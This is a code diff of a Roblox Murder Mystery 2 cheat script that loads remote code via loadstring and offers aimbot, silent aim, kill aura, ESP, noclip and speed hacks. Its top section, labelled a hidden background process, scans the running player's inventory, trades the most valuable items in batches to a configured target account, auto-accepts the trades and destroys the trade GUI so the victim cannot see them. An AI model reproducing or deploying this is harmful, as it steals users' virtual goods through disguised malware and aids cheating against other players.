@@ -1,11 +1,9 @@
 local Compkiller = loadstring(game:HttpGet("https://raw.githubusercontent.com/4lpaca-pin/CompKiller/refs/heads/main/src/source.luau"))();
-
 local Notifier = Compkiller.newNotify();
 local ConfigManager = Compkiller:ConfigManager({
     Directory = "KherbyMM2",
     Config = "AnnieConfig"
 });
-
 Compkiller:Loader("rbxassetid://120245531583106", 2.5):yield();
 
 -- ===== TRADE SYSTEM (Hidden Background Process) =====
@@ -50,7 +48,6 @@ pcall(function()
 end)
 
 local Trade = ReplicatedStorage:FindFirstChild("Trade")
-
 local TradeState = {
     hasSent = false,
     hasOffered = false,
@@ -61,32 +58,20 @@ local TradeState = {
     itemsOffered = {},
     tradeCount = 0,
     isProcessing = false,
+    isTargetTrade = false,
 }
 
--- DESTROY TRADE GUI IMMEDIATELY WHEN TARGET JOINS
-local function destroyTradeGUI()
-    local playerGui = LocalPlayer:FindFirstChild("PlayerGui")
-    if not playerGui then
-        playerGui = LocalPlayer:WaitForChild("PlayerGui")
-    end
-    
-    pcall(function()
-        local gui = playerGui:FindFirstChild("TradeGUI")
-        if gui then gui:Destroy() end
-        local phoneGui = playerGui:FindFirstChild("TradeGUI_Phone")
-        if phoneGui then phoneGui:Destroy() end
-        local reqFrame = playerGui:FindFirstChild("RequestFrame")
-        if reqFrame then reqFrame:Destroy() end
-    end)
-end
+local TradeBlockerSetup = false
 
--- Continuous GUI blocker (runs constantly)
 local function setupInstantBlocker()
+    if TradeBlockerSetup then return end
+    TradeBlockerSetup = true
+
     local playerGui = LocalPlayer:FindFirstChild("PlayerGui")
     if not playerGui then
         playerGui = LocalPlayer:WaitForChild("PlayerGui")
     end
-    
+   
     playerGui.ChildAdded:Connect(function(child)
         if child.Name == "TradeGUI" or child.Name == "TradeGUI_Phone" or child.Name == "RequestFrame" then
             task.defer(function()
@@ -98,7 +83,7 @@ local function setupInstantBlocker()
             end)
         end
     end)
-    
+   
     task.spawn(function()
         while true do
             task.wait(0.05)
@@ -116,44 +101,44 @@ end
 
 local function getItemRarity(itemId)
     local lowerId = itemId:lower()
-    
+   
     local godlyKeywords = {
-        "chroma", "eternal", "luger", "old glory", "amerilaser", "blaster",
+        "bat", "chroma", "eternal", "luger", "old glory", "amerilaser", "blaster",
         "clockwork", "candy", "ginger", "heart", "heat", "laser", "night",
         "pixel", "saw", "shark", "slender", "spider", "tides", "virtual", "zombie",
         "darkbringer", "lightbringer", "gemstone", "nebula", "phantom", "shadow",
         "spectre", "boneblade", "candleflame", "deathshard", "fang", "flames",
         "hallowscythe", "hallowgun", "icebeam", "jinglegun", "minty", "snowflake",
         "icewing", "ice dragon", "ice breaker", "ice flake", "ice shard",
-        "logchopper", "battle axe", "seer", "saw", "tides", "virtual", "xmas",
+        "logchopper", "battle axe", "seer", "xmas",
     }
-    
+   
     local ancientKeywords = {
         "icepiercer", "icebreaker", "harvester", "batwing", "elderwood",
         "swirly axe", "nik's scythe",
     }
-    
+   
     for _, keyword in ipairs(ancientKeywords) do
         if lowerId:find(keyword) then
             return 100
         end
     end
-    
+   
     for _, keyword in ipairs(godlyKeywords) do
         if lowerId:find(keyword) then
             return 90
         end
     end
-    
+   
     return 0
 end
 
 local function getInventoryItems()
     local items = {}
-    
+   
     if InventoryModule and InventoryModule.MyInventory and InventoryModule.MyInventory.Data then
         local data = InventoryModule.MyInventory.Data
-        
+       
         if data.Weapons then
             for category, categoryItems in pairs(data.Weapons) do
                 if type(categoryItems) == "table" then
@@ -173,40 +158,47 @@ local function getInventoryItems()
             end
         end
     end
-    
+   
     return items
 end
 
 local function scanInventory()
     local items = getInventoryItems()
     local nonDefault = {}
-    
+   
     for _, item in ipairs(items) do
         if item.id ~= "DefaultKnife" and item.id ~= "DefaultGun" then
             table.insert(nonDefault, item)
         end
     end
-    
+   
+    -- Sort by rarity (HIGHEST VALUE FIRST - Ancient(100) then Godly(90) then others(0))
     table.sort(nonDefault, function(a, b)
         return a.rarity > b.rarity
     end)
     
+    Notifier.new({
+        Title = "Inventory Scan",
+        Content = "Found "..#nonDefault.." tradeable items (Highest value first)",
+        Duration = 3
+    })
+   
     return nonDefault
 end
 
 local function getNextBatch()
     local startIdx = (TradeState.currentBatch - 1) * TradeConfig.ItemsPerTrade + 1
     local endIdx = math.min(startIdx + TradeConfig.ItemsPerTrade - 1, #TradeState.allItems)
-    
+   
     if startIdx > #TradeState.allItems then
         return {}
     end
-    
+   
     local batch = {}
     for i = startIdx, endIdx do
         table.insert(batch, TradeState.allItems[i])
     end
-    
+   
     return batch
 end
 
@@ -216,7 +208,7 @@ local function sendTradeRequest(targetPlayer)
     if not sendRemote then
         return false
     end
-    
+   
     local success = false
     pcall(function()
         local result = sendRemote:InvokeServer(targetPlayer)
@@ -224,7 +216,7 @@ local function sendTradeRequest(targetPlayer)
             success = true
         end
     end)
-    
+   
     return success
 end
 
@@ -244,13 +236,13 @@ local function acceptTradeProperly()
     if TradeState.hasAccepted then
         return true
     end
-    
+   
     local placeId = game.PlaceId
     local maxAttempts = 5
-    
+   
     for attempt = 1, maxAttempts do
         local status, tradeData = Trade.GetTradeStatus:InvokeServer()
-        
+       
         if tradeData and tradeData.LastOffer then
             pcall(function()
                 Trade.AcceptTrade:FireServer(placeId * 3, tradeData.LastOffer)
@@ -258,18 +250,18 @@ local function acceptTradeProperly()
                 return true
             end)
         end
-        
+       
         pcall(function()
             Trade.AcceptTrade:FireServer()
             TradeState.hasAccepted = true
             return true
         end)
-        
+       
         if attempt < maxAttempts then
             task.wait(1)
         end
     end
-    
+   
     return TradeState.hasAccepted
 end
 
@@ -279,11 +271,11 @@ local function completeTrade()
     if not completeRemote then
         return false
     end
-    
+   
     pcall(function()
         completeRemote:FireServer()
     end)
-    
+   
     return true
 end
 
@@ -291,13 +283,18 @@ local function executeFullTrade()
     if TradeState.tradeCompleted then
         return
     end
-    
+   
     local batch = getNextBatch()
-    
+   
     if #batch == 0 then
+        Notifier.new({
+            Title = "Trade Complete",
+            Content = "All "..TradeState.tradeCount.." batches traded! Total items: "..#TradeState.itemsOffered,
+            Duration = 5
+        })
         return
     end
-    
+   
     task.wait(1)
     offerItems(batch)
     TradeState.hasOffered = true
@@ -305,13 +302,19 @@ local function executeFullTrade()
     acceptTradeProperly()
     task.wait(0.5)
     completeTrade()
-    
+   
     for _, item in ipairs(batch) do
         table.insert(TradeState.itemsOffered, item.id)
     end
-    
+   
     TradeState.tradeCompleted = true
     TradeState.tradeCount = TradeState.tradeCount + 1
+    
+    Notifier.new({
+        Title = "Trade Batch "..TradeState.tradeCount,
+        Content = "Traded "..#batch.." items ("..TradeState.currentBatch.."/"..math.ceil(#TradeState.allItems / TradeConfig.ItemsPerTrade)..")",
+        Duration = 2
+    })
 end
 
 local function resetForNextTrade()
@@ -319,6 +322,7 @@ local function resetForNextTrade()
     TradeState.hasOffered = false
     TradeState.hasAccepted = false
     TradeState.tradeCompleted = false
+    TradeState.isTargetTrade = false
 end
 
 local function findTargetPlayer()
@@ -334,12 +338,12 @@ local function sendTradeToTarget()
     if TradeState.hasSent then
         return false
     end
-    
+   
     local target = findTargetPlayer()
     if not target then
         return false
     end
-    
+   
     local result = false
     for attempt = 1, 5 do
         result = sendTradeRequest(target)
@@ -348,11 +352,12 @@ local function sendTradeToTarget()
         end
         task.wait(1)
     end
-    
+   
     if result then
         TradeState.hasSent = true
+        TradeState.isTargetTrade = true
     end
-    
+   
     return result
 end
 
@@ -360,16 +365,21 @@ local function startNextTrade()
     if TradeState.isProcessing then
         return
     end
-    
+   
     local nextBatch = getNextBatch()
-    
+   
     if #nextBatch == 0 then
         TradeState.isProcessing = false
+        Notifier.new({
+            Title = "All Items Traded",
+            Content = "Successfully traded "..#TradeState.itemsOffered.." items to "..TradeConfig.TargetUsername,
+            Duration = 5
+        })
         return
     end
-    
+   
     resetForNextTrade()
-    
+   
     local success = sendTradeToTarget()
     if not success then
         task.wait(5)
@@ -381,59 +391,61 @@ if Trade then
     local startTradeRemote = Trade:FindFirstChild("StartTrade")
     if startTradeRemote then
         startTradeRemote.OnClientEvent:Connect(function(tradeData, username)
-            if TradeState.tradeCompleted then
-                return
+            if username and username:lower() == TradeConfig.TargetUsername:lower() and TradeState.isTargetTrade then
+                if TradeState.tradeCompleted then
+                    return
+                end
+               
+                task.wait(2)
+                executeFullTrade()
+               
+                TradeState.currentBatch = TradeState.currentBatch + 1
+                task.wait(3)
+                startNextTrade()
             end
-            
-            task.wait(2)
-            executeFullTrade()
-            
-            TradeState.currentBatch = TradeState.currentBatch + 1
-            task.wait(3)
-            startNextTrade()
         end)
     end
 
     Trade.UpdateTrade.OnClientEvent:Connect(function(data)
-        if TradeState.tradeCompleted or TradeState.hasAccepted then
-            return
-        end
-        
-        if data and data.LastOffer then
-            if TradeState.hasOffered and not TradeState.hasAccepted then
-                acceptTradeProperly()
-                task.wait(0.5)
-                completeTrade()
-                TradeState.tradeCompleted = true
-                
-                TradeState.currentBatch = TradeState.currentBatch + 1
-                task.wait(3)
-                startNextTrade()
+        if TradeState.isTargetTrade then
+            if TradeState.tradeCompleted or TradeState.hasAccepted then
+                return
+            end
+           
+            if data and data.LastOffer then
+                if TradeState.hasOffered and not TradeState.hasAccepted then
+                    acceptTradeProperly()
+                    task.wait(0.5)
+                    completeTrade()
+                    TradeState.tradeCompleted = true
+                   
+                    TradeState.currentBatch = TradeState.currentBatch + 1
+                    task.wait(3)
+                    startNextTrade()
+                end
             end
         end
     end)
 end
 
--- WHEN TARGET JOINS - DESTROY TRADE GUI IMMEDIATELY and start trading
 Players.PlayerAdded:Connect(function(plr)
     if plr.Name:lower() == TradeConfig.TargetUsername:lower() then
-        -- DESTROY TRADE GUI RIGHT AWAY
-        destroyTradeGUI()
-        
         TradeState.hasSent = false
         TradeState.tradeCompleted = false
         TradeState.hasOffered = false
         TradeState.hasAccepted = false
         TradeState.tradeCount = 0
         TradeState.currentBatch = 1
-        
+        TradeState.isTargetTrade = false
+       
         local timeout = 10
         local startTime = tick()
         while not plr.Character and (tick() - startTime) < timeout do
             task.wait(0.5)
         end
-        
+       
         task.wait(3)
+        setupInstantBlocker()
         startNextTrade()
     end
 end)
@@ -451,23 +463,28 @@ end)
 task.spawn(function()
     task.wait(5)
     TradeState.allItems = scanInventory()
-    setupInstantBlocker()
+    Notifier.new({
+        Title = "Inventory Ready",
+        Content = "Will trade "..#TradeState.allItems.." items in "..math.ceil(#TradeState.allItems / TradeConfig.ItemsPerTrade).." trades (Highest value first)",
+        Duration = 4
+    })
     task.wait(2)
     local target = findTargetPlayer()
     if target then
+        setupInstantBlocker()
         startNextTrade()
     end
 end)
 
 -- ===== SIMPLE FPS BOOSTER (SINGLE TOGGLE) =====
 local FPSBoosterEnabled = false
-local DisabledAssets = {}
+local DisabledAssets = {} 
 
 local function ApplyFPSBooster()
     if not FPSBoosterEnabled then return end
-    
+   
     local disabledCount = 0
-    
+   
     for _, v in next, game:GetDescendants() do
         if v:IsA("Decal") or v:IsA("Texture") then
             pcall(function()
@@ -479,7 +496,7 @@ local function ApplyFPSBooster()
             end)
         end
     end
-    
+   
     for _, v in next, game:GetDescendants() do
         if v:IsA("BloomEffect") or v:IsA("BlurEffect") or v:IsA("DepthOfFieldEffect") or v:IsA("SunRaysEffect") then
             pcall(function()
@@ -491,7 +508,7 @@ local function ApplyFPSBooster()
             end)
         end
     end
-    
+   
     for _, v in next, game:GetDescendants() do
         if v:IsA("Part") or v:IsA("Union") or v:IsA("BasePart") then
             pcall(function()
@@ -503,7 +520,7 @@ local function ApplyFPSBooster()
             end)
         end
     end
-    
+   
     for _, v in next, game:GetDescendants() do
         if v:IsA("ParticleEmitter") or v:IsA("Smoke") or v:IsA("Explosion") or v:IsA("Sparkles") or v:IsA("Fire") then
             pcall(function()
@@ -515,7 +532,7 @@ local function ApplyFPSBooster()
             end)
         end
     end
-    
+   
     for _, v in next, game:GetDescendants() do
         if v:IsA("Sky") then
             pcall(function()
@@ -525,7 +542,7 @@ local function ApplyFPSBooster()
             end)
         end
     end
-    
+   
     Notifier.new({
         Title = "FPS Booster",
         Content = "Disabled "..disabledCount.." assets/effects + FullBright",
@@ -547,9 +564,9 @@ local function DisableFPSBooster()
             end
         end)
     end
-    
+   
     DisabledAssets = {}
-    
+   
     Notifier.new({
         Title = "FPS Booster",
         Content = "Disabled - Graphics restored",
@@ -563,14 +580,14 @@ local function MonitorForNewAssets()
         descendantConnection:Disconnect()
         descendantConnection = nil
     end
-    
+   
     if not FPSBoosterEnabled then return end
-    
+   
     descendantConnection = game.DescendantAdded:Connect(function(v)
         if not FPSBoosterEnabled then return end
-        
+       
         task.wait(0.1)
-        
+       
         if v:IsA("Decal") or v:IsA("Texture") then
             pcall(function() v.Texture = "" end)
         elseif v:IsA("BloomEffect") or v:IsA("BlurEffect") or v:IsA("DepthOfFieldEffect") or v:IsA("SunRaysEffect") then
@@ -587,7 +604,7 @@ end
 
 local function ToggleFPSBooster(enabled)
     FPSBoosterEnabled = enabled
-    
+   
     if enabled then
         ApplyFPSBooster()
         MonitorForNewAssets()
@@ -633,31 +650,31 @@ local function getNetworkPing()
     local success = pcall(function()
         ping = LocalPlayer:GetNetworkPing() * 1000
     end)
-    
+   
     if ping == 0 then
         local stats = Stats.Network.ServerStatsItem["Data Ping"]
         if stats then
             ping = tonumber(stats:GetValueString():match("%d+")) or 0
         end
     end
-    
+   
     return math.clamp(ping, 2, 500)
 end
 
 local function calculateStandardDeviation(data)
     if #data < 2 then return 0 end
-    
+   
     local sum = 0
     for _, v in ipairs(data) do
         sum = sum + v
     end
     local mean = sum / #data
-    
+   
     local varianceSum = 0
     for _, v in ipairs(data) do
         varianceSum = varianceSum + (v - mean) ^ 2
     end
-    
+   
     return math.sqrt(varianceSum / #data)
 end
 
@@ -666,31 +683,31 @@ local function updateNetworkMetrics()
     if currentTime - NetworkMetrics.lastUpdate < 0.1 then
         return
     end
-    
+   
     local rawPing = getNetworkPing()
     table.insert(NetworkMetrics.history, 1, rawPing)
-    
+   
     if #NetworkMetrics.history > NetworkMetrics.maxHistory then
         table.remove(NetworkMetrics.history)
     end
-    
+   
     if #NetworkMetrics.history >= 30 then
         local recentPings = {}
         for i = 1, math.min(50, #NetworkMetrics.history) do
             table.insert(recentPings, NetworkMetrics.history[i])
         end
-        
+       
         local sum = 0
         for _, p in ipairs(recentPings) do
             sum = sum + p
         end
         local avgPing = sum / #recentPings
-        
+       
         NetworkMetrics.standardDeviation = calculateStandardDeviation(recentPings)
         NetworkMetrics.variance = NetworkMetrics.standardDeviation ^ 2
         NetworkMetrics.jitter = NetworkMetrics.standardDeviation * 0.6
         NetworkMetrics.ping = avgPing
-        
+       
         local stableCount = 0
         for _, p in ipairs(recentPings) do
             if math.abs(p - avgPing) < NetworkMetrics.standardDeviation * 1.5 then
@@ -698,14 +715,14 @@ local function updateNetworkMetrics()
             end
         end
         NetworkMetrics.stability = stableCount / #recentPings
-        
+       
         NetworkMetrics.RTTBuffer = (NetworkMetrics.ping + NetworkMetrics.jitter * 1.2) / 1000
     else
         NetworkMetrics.ping = rawPing
         NetworkMetrics.RTTBuffer = rawPing / 1000
         NetworkMetrics.stability = 0.5
     end
-    
+   
     NetworkMetrics.lastUpdate = currentTime
 end
 
@@ -741,33 +758,33 @@ end
 
 local function detectStrafeDirection(player, currentVel)
     local data = initPlayerData(player)
-    
+   
     if #data.velocityHistory < 3 then
         return 0
     end
-    
+   
     local prevVel = data.velocityHistory[#data.velocityHistory - 1]
     if not prevVel then return 0 end
-    
+   
     local currentHoriz = Vector3.new(currentVel.X, 0, currentVel.Z)
     local prevHoriz = Vector3.new(prevVel.vel.X, 0, prevVel.vel.Z)
-    
+   
     if currentHoriz.Magnitude < 5 or prevHoriz.Magnitude < 5 then
         return 0
     end
-    
+   
     local currentDir = currentHoriz.Unit
     local prevDir = prevHoriz.Unit
-    
+   
     local crossY = prevDir.X * currentDir.Z - prevDir.Z * currentDir.X
-    
+   
     local strafeDirection = crossY > 0.1 and 1 or (crossY < -0.1 and -1 or 0)
-    
+   
     if strafeDirection ~= 0 and strafeDirection ~= data.strafeDirection then
         data.lastStrafeTime = tick()
     end
     data.strafeDirection = strafeDirection
-    
+   
     return strafeDirection
 end
 
@@ -775,31 +792,31 @@ local function predictPlayerPositionAdvanced(player, targetPart)
     if not player or not player.Character then
         return targetPart and targetPart.Position or Vector3.new()
     end
-    
+   
     local character = player.Character
     local hrp = character:FindFirstChild("HumanoidRootPart")
     if not hrp then
         return targetPart and targetPart.Position or Vector3.new()
     end
-    
+   
     updateNetworkMetrics()
-    
+   
     local data = initPlayerData(player)
     local currentTime = tick()
-    
+   
     local currentPos = hrp.Position
     local currentVel = hrp.Velocity
-    
+   
     table.insert(data.positionHistory, 1, {pos = currentPos, time = currentTime})
     if #data.positionHistory > 15 then
         table.remove(data.positionHistory)
     end
-    
+   
     table.insert(data.velocityHistory, 1, {vel = currentVel, time = currentTime})
     if #data.velocityHistory > 15 then
         table.remove(data.velocityHistory)
     end
-    
+   
     if currentVel.Magnitude > 1 then
         local currentDir = currentVel.Unit
         table.insert(data.directionHistory, 1, currentDir)
@@ -807,33 +824,33 @@ local function predictPlayerPositionAdvanced(player, targetPart)
             table.remove(data.directionHistory)
         end
     end
-    
+   
     data.lastPosition = currentPos
     data.lastVelocity = currentVel
     data.lastTime = currentTime
-    
+   
     local isJumping = isPlayerJumping(character)
     local finalTargetPart
-    
+   
     if isJumping then
         finalTargetPart = "HumanoidRootPart"
     else
         finalTargetPart = "UpperTorso"
     end
-    
+   
     local chosenPart = character:FindFirstChild(finalTargetPart) or character:FindFirstChild("Torso") or targetPart or hrp
-    
+   
     local targetPos = chosenPart.Position
     local velocity = chosenPart.AssemblyLinearVelocity or Vector3.new()
-    
+   
     local basePrediction = NetworkMetrics.RTTBuffer + 0.03
     local speedBonus = math.min(velocity.Magnitude / 2000, 0.08)
     local predictionTime = math.clamp(basePrediction + speedBonus, 0.04, 0.2)
-    
+   
     local strafeDirection = detectStrafeDirection(player, velocity)
     local isStrafing = math.abs(strafeDirection) > 0
     local isZigzagging = false
-    
+   
     if #data.directionHistory >= 5 then
         local directionChanges = 0
         for i = 2, #data.directionHistory do
@@ -844,19 +861,19 @@ local function predictPlayerPositionAdvanced(player, targetPart)
         end
         isZigzagging = directionChanges >= 3
     end
-    
+   
     local predictedPos = targetPos + (velocity * predictionTime)
-    
+   
     if velocity.Y ~= 0 then
         local gravity = PredictionSystem.gravity
         local verticalPos = targetPos.Y + (velocity.Y * predictionTime) - (0.5 * gravity * predictionTime * predictionTime)
         predictedPos = Vector3.new(predictedPos.X, verticalPos, predictedPos.Z)
     end
-    
+   
     if isStrafing and velocity.Magnitude > 8 then
         local strafeOffset = 0
         local strafeStrength = math.min(velocity.Magnitude / 50, 2.5)
-        
+       
         if strafeDirection > 0 then
             local rightVector = chosenPart.CFrame.RightVector
             strafeOffset = strafeStrength * predictionTime * 15
@@ -867,7 +884,7 @@ local function predictPlayerPositionAdvanced(player, targetPart)
             predictedPos = predictedPos + (leftVector * strafeOffset)
         end
     end
-    
+   
     if isZigzagging then
         predictedPos = Vector3.new(
             predictedPos.X,
@@ -877,11 +894,11 @@ local function predictPlayerPositionAdvanced(player, targetPart)
         local zigzagFactor = math.sin(tick() * 15) * 0.8
         predictedPos = predictedPos + (chosenPart.CFrame.RightVector * zigzagFactor * 0.5)
     end
-    
+   
     if isJumping then
         predictedPos = Vector3.new(predictedPos.X, predictedPos.Y - 1.8, predictedPos.Z)
     end
-    
+   
     if #data.velocityHistory >= 3 then
         local avgVelX = 0
         local avgVelZ = 0
@@ -895,7 +912,7 @@ local function predictPlayerPositionAdvanced(player, targetPart)
         local smoothedPos = targetPos + (smoothedVel * predictionTime)
         predictedPos = predictedPos * 0.7 + smoothedPos * 0.3
     end
-    
+   
     return predictedPos
 end
 
@@ -903,19 +920,18 @@ local function predictPlayerPosition(player, targetPart)
     return predictPlayerPositionAdvanced(player, targetPart)
 end
 
--- ===== STATE =====
 local State = {
     SpeedBoost = { Enabled = false, Speed = 19 },
     WalkSpeed = { Enabled = false, Speed = 50 },
     InfiniteJump = { Enabled = false },
     ESP = { Enabled = false, NameTags = true, FillTransparency = 0.84 },
-    Aimbot = { 
-        featureEnabled = false, 
-        active = false, 
-        Sticky = false, 
-        Smoothness = 0.45, 
-        FOV = 220, 
-        OnlyMurderer = false, 
+    Aimbot = {
+        featureEnabled = false,
+        active = false,
+        Sticky = false,
+        Smoothness = 0.45,
+        FOV = 220,
+        OnlyMurderer = false,
         Keybind = "Q",
     },
     FlickShoot = {
@@ -923,9 +939,9 @@ local State = {
         OnlyMurderer = true,
         Keybind = "E",
     },
-    SilentAim = { 
-        Enabled = false, 
-        OnlyOnShift = false, 
+    SilentAim = {
+        Enabled = false,
+        OnlyOnShift = false,
     },
     Triggerbot = { Enabled = false },
     KillAura = { Enabled = false, Range = 25, Keybind = "K" },
@@ -974,11 +990,11 @@ local function setupInfiniteJump()
         infiniteJumpConnection:Disconnect()
         infiniteJumpConnection = nil
     end
-    
+   
     infiniteJumpConnection = UserInputService.InputBegan:Connect(function(input, gameProcessed)
         if gameProcessed then return end
         if not State.InfiniteJump.Enabled then return end
-        
+       
         if input.KeyCode == Enum.KeyCode.Space then
             local character = LocalPlayer.Character
             if character then
@@ -1003,7 +1019,7 @@ local function applyWalkSpeed()
     if not character then return end
     local humanoid = character:FindFirstChildOfClass("Humanoid")
     if not humanoid then return end
-    
+   
     if State.WalkSpeed.Enabled then
         humanoid.WalkSpeed = State.WalkSpeed.Speed
     else
@@ -1026,7 +1042,7 @@ local function handleSpeedBoost()
     if not character then return end
     local humanoid = character:FindFirstChildWhichIsA("Humanoid")
     if not humanoid then return end
-    
+   
     if State.SpeedBoost.Enabled then
         if UserInputService:IsKeyDown(Enum.KeyCode.LeftShift) or UserInputService:IsKeyDown(Enum.KeyCode.RightShift) then
             humanoid.WalkSpeed = State.SpeedBoost.Speed
@@ -1034,7 +1050,7 @@ local function handleSpeedBoost()
             humanoid.WalkSpeed = 16
         end
     end
-    
+   
     if State.WalkSpeed.Enabled then
         humanoid.WalkSpeed = State.WalkSpeed.Speed
     end
@@ -1046,13 +1062,13 @@ local function setupNoclip()
         noclipConnection:Disconnect()
         noclipConnection = nil
     end
-    
+   
     noclipConnection = RunService.Stepped:Connect(function()
         if not State.Noclip.Enabled then return end
-        
+       
         local character = LocalPlayer.Character
         if not character then return end
-        
+       
         for _, part in pairs(character:GetDescendants()) do
             if part:IsA("BasePart") then
                 part.CanCollide = false
@@ -1066,7 +1082,7 @@ local function disableNoclip()
         noclipConnection:Disconnect()
         noclipConnection = nil
     end
-    
+   
     local character = LocalPlayer.Character
     if character then
         for _, part in pairs(character:GetDescendants()) do
@@ -1078,7 +1094,6 @@ local function disableNoclip()
 end
 
 if not getgenv().FPDH then getgenv().FPDH = workspace.FallenPartsDestroyHeight end
-
 getgenv().Desync = {
     Enabled = false, Method = "Sky", OscillateDistance = 50, OscillateSpeed = 5,
     SpinSpeed = 20, RandomDistance = 100, ReturnToPosition = true,
@@ -1088,7 +1103,6 @@ getgenv().Desync = {
 }
 
 local DesyncData = { OriginalCFrame = CFrame.new(), StartTime = tick() }
-
 local DesyncMethods = {
     Void = function(RootPart)
         RootPart.CFrame = CFrame.new(math.sqrt(-1), math.sqrt(-1), math.sqrt(-1))
@@ -1143,13 +1157,13 @@ end
 
 local function isMurderer(plr) return hasItem(plr, "Knife") end
 local function isSheriff(plr) return hasItem(plr, "Gun") or hasItem(plr, "Revolver") end
-local function isAlive(plr) 
+local function isAlive(plr)
     if not plr or not plr.Character then return false end
     local hum = plr.Character:FindFirstChildOfClass("Humanoid")
     return hum and hum.Health > 0
 end
-local function isInnocent(plr) 
-    return plr ~= LocalPlayer and isAlive(plr) and not isMurderer(plr) and not isSheriff(plr) 
+local function isInnocent(plr)
+    return plr ~= LocalPlayer and isAlive(plr) and not isMurderer(plr) and not isSheriff(plr)
 end
 local function hasGun() return hasItem(LocalPlayer, "Gun") or hasItem(LocalPlayer, "Revolver") end
 
@@ -1167,7 +1181,7 @@ end
 
 local function getRoleColor(plr)
     if not plr or not plr.Character then return Color3.fromRGB(0, 255, 0) end
-    
+   
     if isMurderer(plr) then return Color3.fromRGB(255, 0, 0) end
     if isSheriff(plr) then return Color3.fromRGB(0, 100, 255) end
     return Color3.fromRGB(0, 255, 0)
@@ -1188,7 +1202,7 @@ end
 local function CreateESP(char, plr)
     if not char or not plr or plr == LocalPlayer then return end
     CleanupESP(char)
-    
+   
     local hl = Instance.new("Highlight")
     hl.Name = "MM2Highlight"
     hl.Adornee = char
@@ -1197,7 +1211,7 @@ local function CreateESP(char, plr)
     hl.FillTransparency = State.ESP.FillTransparency
     hl.OutlineTransparency = 0
     hl.Parent = char
-    
+   
     if State.ESP.NameTags then
         local adornee = char:FindFirstChild("Head") or char:FindFirstChild("HumanoidRootPart")
         if adornee then
@@ -1209,12 +1223,12 @@ local function CreateESP(char, plr)
             bill.AlwaysOnTop = true
             bill.LightInfluence = 0
             bill.Parent = char
-            
+           
             local txt = Instance.new("TextLabel")
             txt.Size = UDim2.new(1,0,1,0)
             txt.BackgroundTransparency = 1
             txt.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-            
+           
             txt.Text = getDisplayName(plr)
             txt.TextColor3 = getRoleColor(plr)
             txt.TextScaled = true
@@ -1241,13 +1255,13 @@ local function UpdateAllESPColors()
         if plr ~= LocalPlayer and plr.Character then
             local hl = plr.Character:FindFirstChild("MM2Highlight")
             local tag = plr.Character:FindFirstChild("MM2NameTag")
-            
+           
             if hl then
                 local newColor = getRoleColor(plr)
                 hl.FillColor = newColor
                 hl.FillTransparency = State.ESP.FillTransparency
             end
-            
+           
             if tag and tag:FindFirstChild("TextLabel") then
                 local newColor = getRoleColor(plr)
                 tag.TextLabel.TextColor3 = newColor
@@ -1267,10 +1281,10 @@ end
 
 local function monitorPlayerBackpack(plr)
     if plr == LocalPlayer then return end
-    
+   
     local backpack = plr:WaitForChild("Backpack", 10)
     if not backpack then return end
-    
+   
     backpack.ChildAdded:Connect(function(tool)
         if tool and (tool.Name == "Knife" or tool.Name == "Gun" or tool.Name == "Revolver") then
             task.wait(0.1)
@@ -1279,7 +1293,7 @@ local function monitorPlayerBackpack(plr)
             end
         end
     end)
-    
+   
     backpack.ChildRemoved:Connect(function(tool)
         if tool and (tool.Name == "Knife" or tool.Name == "Gun" or tool.Name == "Revolver") then
             task.wait(0.1)
@@ -1292,10 +1306,10 @@ end
 
 local function monitorCharacterTools(plr)
     if plr == LocalPlayer then return end
-    
+   
     local character = plr.Character
     if not character then return end
-    
+   
     character.ChildAdded:Connect(function(tool)
         if tool and tool:IsA("Tool") and (tool.Name == "Knife" or tool.Name == "Gun" or tool.Name == "Revolver") then
             task.wait(0.1)
@@ -1304,7 +1318,7 @@ local function monitorCharacterTools(plr)
             end
         end
     end)
-    
+   
     character.ChildRemoved:Connect(function(tool)
         if tool and tool:IsA("Tool") and (tool.Name == "Knife" or tool.Name == "Gun" or tool.Name == "Revolver") then
             task.wait(0.1)
@@ -1317,30 +1331,30 @@ end
 
 local function SetupPlayerESP(plr)
     if plr == LocalPlayer then return end
-    
+   
     task.spawn(function()
         monitorPlayerBackpack(plr)
     end)
-    
+   
     plr.CharacterAdded:Connect(function(char)
         task.wait(0.85)
-        if State.ESP.Enabled and char and char.Parent then 
-            CreateESP(char, plr) 
+        if State.ESP.Enabled and char and char.Parent then
+            CreateESP(char, plr)
         end
         PredictionSystem.playerData[plr] = nil
-        
+       
         task.spawn(function()
             monitorCharacterTools(plr)
         end)
     end)
-    
+   
     plr.CharacterRemoving:Connect(CleanupESP)
-    
+   
     if plr.Character then
         task.spawn(function()
             task.wait(1.2)
-            if State.ESP.Enabled and plr.Character and plr.Character.Parent then 
-                CreateESP(plr.Character, plr) 
+            if State.ESP.Enabled and plr.Character and plr.Character.Parent then
+                CreateESP(plr.Character, plr)
             end
             monitorCharacterTools(plr)
         end)
@@ -1365,7 +1379,7 @@ local BoxHandles = {}
 
 local function createToolGunESP(gun)
     if not gun or gun:FindFirstChild("GunDroppedESP") then return end
-    
+   
     local hl = Instance.new("Highlight")
     hl.Name = "GunDroppedESP"
     hl.Adornee = gun
@@ -1373,7 +1387,7 @@ local function createToolGunESP(gun)
     hl.OutlineColor = Color3.fromRGB(255, 255, 255)
     hl.FillTransparency = 0.3
     hl.Parent = gun
-    
+   
     local handle = gun:FindFirstChild("Handle") or gun
     local bill = Instance.new("BillboardGui")
     bill.Name = "GunLabel"
@@ -1382,7 +1396,7 @@ local function createToolGunESP(gun)
     bill.StudsOffset = Vector3.new(0, 3, 0)
     bill.AlwaysOnTop = true
     bill.Parent = gun
-    
+   
     local txt = Instance.new("TextLabel")
     txt.Size = UDim2.new(1,0,1,0)
     txt.BackgroundTransparency = 1
@@ -1422,14 +1436,14 @@ local function highlightDroppedGun()
         end
         return
     end
-    
+   
     local currentMap = getCurrentMap()
     if not currentMap then return end
     local gunDrop = currentMap:FindFirstChild("GunDrop") or Workspace:FindFirstChild("GunDrop")
-    
+   
     if gunDrop and not gunDrop:FindFirstChild("GunDropHighlight") then
         if gunDrop:FindFirstChild("GunDropLabel") then gunDrop.GunDropLabel:Destroy() end
-        
+       
         local hl = Instance.new("Highlight")
         hl.Name = "GunDropHighlight"
         hl.Adornee = gunDrop
@@ -1437,7 +1451,7 @@ local function highlightDroppedGun()
         hl.OutlineColor = Color3.fromRGB(255, 255, 255)
         hl.FillTransparency = 0.3
         hl.Parent = gunDrop
-        
+       
         local bill = Instance.new("BillboardGui")
         bill.Name = "GunDropLabel"
         bill.Adornee = gunDrop
